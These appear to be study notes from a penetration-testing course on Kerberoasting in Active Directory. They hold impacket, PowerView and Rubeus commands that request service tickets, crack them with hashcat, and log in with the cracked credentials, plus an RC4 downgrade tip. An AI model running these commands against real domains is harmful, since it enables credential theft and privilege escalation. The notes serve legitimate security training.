# Recap

Prerequisite:  
Authenticated domain user.

Attack:
1. Request service ticket (TGS) for SPN account
2. Receive ticket encrypted with service account hash.
3. Extract hash.
4. Crack offline.

If cracked:  
You recover service account password.
If this is privileged credentials, can see where we can use these credentials
eg. 
- access host via RDP or WinRM as local user or local admin
- Authenticate to remote host as admin using tool like PsExec
- Gain access to sensiive file share
- Gain MSSQL access to host as DBA user, which then can be leveraged to escalate privilges

Service accounts often:
- Have weak passwords
- Are privileged
- Run critical services

# From Linux
Install impacket
- `git clone https://github.com/fortra/impacket
- `sudo python3 -m pip install .
- `GetUserSPNs.py -h
	- Lists SPNs in the domain
	- Require: set of **valid domain credentials** and **IP of DC**
		- Can authenticate with cleartext pw, NT password hash or Kerberos ticket
- `GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend`
	- Best to take note of accounts that are part of **domain admins** group
- `GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request`
	- Pull TGS tickets for offline processing
- Other flags
	- `-request user` - specific user
	- `-sqldev_tgs` - output to specific file

Crack offline with hashcat
- `hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt `

Then have creds, can authenticate to DC
- `sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!
`
# From Windows
- Manual method: view HTB

## PowerView
- `Import-Module .\PowerView.ps1`
- `Get-DomainUser * -spn | select samaccountname`
	- To enumerate spn ACCOUNTS
- `Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat`
- Then crack offline with hashcat

## Rubeus
- `.\Rubeus.exe kerberoast /stats`
 - `.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
	 - Request for accounts with admincount attribute set to 1
- Cracking with hashcat
	- `$krb5tgs$23$*`, is RC4 (type 23) encrypted ticket
	- `$krb5tgs$18$*`. is AES-128 (type 17). This and AES-256 (type 18) take much longer
	- If we use Rubeus with `/tgtdeleg` flag to only get RC4 encryption, this might be faster
	- Can edit encryption type used by Kerberos
		- Group Policy -> Default Domain Policy
		- Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options, then double-clicking on Network security: Configure encryption types allowed for Kerberos and selecting the desired encryption type allowed for Kerberos. Removing all other encryption types except for RC4_HMAC_MD5 would allow for the above downgrade example to occur in 2019